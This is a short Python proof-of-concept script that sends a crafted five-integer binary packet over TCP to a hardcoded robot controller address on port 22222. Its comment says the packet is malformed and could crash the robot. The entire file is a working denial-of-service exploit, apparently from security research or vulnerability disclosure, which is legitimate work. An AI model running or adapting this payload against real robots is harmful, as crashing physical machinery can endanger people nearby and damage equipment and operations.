#!/usr/bin/python3
#
# A simple example of how to send a malformed packet that
# could crash the robot.

import socket, sys, struct, binascii

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ("192.168.88.162", 22222)
print("Connecting to {} port {}".format(*server_address))
sock.connect(server_address)
print("Connected.")


values = (56, 9, 0, 0, 0)
print(values)
packer = struct.Struct(">I I I I I")
packed_data = packer.pack(*values)
print(packed_data)

try:
    print("Sending {!r}".format(binascii.hexlify(packed_data)))
    sock.sendall(packed_data)
finally:
    print("Closing socket")
    sock.close()
